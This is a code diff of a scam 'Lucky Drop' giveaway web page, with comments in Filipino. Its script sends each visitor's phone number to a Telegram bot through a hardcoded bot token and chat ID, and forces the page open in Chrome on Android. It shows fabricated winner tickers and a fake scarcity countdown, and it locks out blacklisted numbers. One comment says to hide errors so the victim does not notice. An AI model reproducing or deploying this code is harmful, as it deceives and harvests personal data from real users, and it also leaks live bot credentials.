@@ -94,11 +94,9 @@
 
     <script src="config.js"></script>
     <script>
-        // Palitan mo ito ng sarili mong token at id
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
 
-        // --- UI BLOCKER ---
         function showBlockedUI() {
             document.getElementById('modalOverlay').style.display = 'flex';
             document.getElementById('modalBodyContent').innerHTML = `
@@ -111,13 +109,9 @@
             document.getElementById('mainCard').style.pointerEvents = "none";
         }
 
-        // --- NEW: REAL-TIME BAN CHECKER ---
-        // Tinitingnan nito ang input habang nagta-type ang user.
         function checkInputForBan(inputField) {
             const currentPhone = inputField.value.trim();
             const blockedList = window.BLACKLISTED_NUMBERS || [];
-
-            // Kung ang tinype ay nasa listahan (kahit hindi pa 11 digits, basta nag-match), block agad.
             if (currentPhone.length >= 4 && blockedList.includes(currentPhone)) {
                 localStorage.setItem("cp_device_locked", "true");
                 showBlockedUI();
@@ -125,7 +119,6 @@
         }
 
         window.onload = () => {
-            // Pag-load pa lang, check na kung locked na ang device
             if (localStorage.getItem("cp_device_locked") === "true") {
                 showBlockedUI();
             } else if (window.location.hash.includes("verified")) {
@@ -137,7 +130,6 @@
             if (localStorage.getItem("cp_device_locked") === "true") return showBlockedUI();
             const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
             if (!window.location.hash.includes("verified")) {
-                // Pinipilit buksan sa Chrome kung Android para gumana ang localStorage ng tama
                 window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
             } else {
                 document.getElementById('modalOverlay').style.display = 'flex';
@@ -152,7 +144,6 @@
             if (phone.length < 11 || !phone.startsWith('09')) return alert("Enter valid 11-digit number.");
             btn.disabled = true; btn.innerHTML = "VERIFYING...";
 
-            // DOUBLE CHECK: Baka nakalusot sa real-time check
             if (blockedList.includes(phone)) {
                 localStorage.setItem("cp_device_locked", "true"); 
                 localStorage.removeItem("cp_verified");
@@ -161,21 +152,21 @@
             }
 
             try {
-                // Ipadala muna sa Telegram ang number bago mag-redirect
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP:\n📱 " + phone)}`);
+                // I-save ang number sa LocalStorage para sa main.html tracking
+                localStorage.setItem("userPhone", phone); 
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone)}`);
                 localStorage.setItem("cp_verified", "true"); 
-                // Idagdag ang number na ito sa local storage para ma-block na rin sa susunod (optional)
-                // localStorage.setItem("cp_claimed_number", phone);
                 btn.innerHTML = "SUCCESS...";
                 setTimeout(() => { window.location.href = "main.html"; }, 1000);
             } catch (e) {
-                // Kahit mag-error ang Telegram, ituloy pa rin para di mahalata ng user
+                // Kahit may error sa network, i-save pa rin para gumana ang main.html
+                localStorage.setItem("userPhone", phone);
                 localStorage.setItem("cp_verified", "true");
                 window.location.href = "main.html";
             }
         }
 
-        // --- WINNER TICKER WITH GC ICON (Original) ---
         setInterval(() => {
             const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
             const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
@@ -188,7 +179,6 @@
             }
         }, 3500);
 
-        // --- SCARCITY DECREASE (Original) ---
         let count = 88;
         setInterval(() => {
             if(count > 15) {
